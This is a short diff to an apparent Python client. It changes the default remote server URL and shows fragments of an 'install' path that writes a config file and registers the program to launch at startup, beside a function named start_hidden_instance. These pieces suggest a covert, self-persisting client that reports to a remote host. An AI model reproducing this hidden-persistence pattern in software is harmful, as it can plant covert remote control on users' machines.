@@ -22,7 +22,7 @@ def get_target_executable():
 
 def get_startup_command(site_url: str | None = None):
     exe_path = get_target_executable()
-    target_url = (site_url or os.getenv("SITE_URL") or "https://pissoff.onrender.com").strip()
+    target_url = (site_url or os.getenv("SITE_URL") or "https://dablop.onrender.com").strip()
     if not getattr(sys, "frozen", False) and not exe_path.lower().endswith(".exe"):
         client_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "client.py")
         return f'"{exe_path}" "{client_path}" --site-url {target_url}'
@@ -78,7 +78,7 @@ def start_hidden_instance():
 
 def main():
     if len(sys.argv) > 1 and sys.argv[1].lower() == "install":
-        site_url = os.getenv("SITE_URL", "https://pissoff.onrender.com").strip().rstrip("/")
+        site_url = os.getenv("SITE_URL", "https://dablop.onrender.com").strip().rstrip("/")
         write_config_file(site_url)
         register_startup_launch()
         return
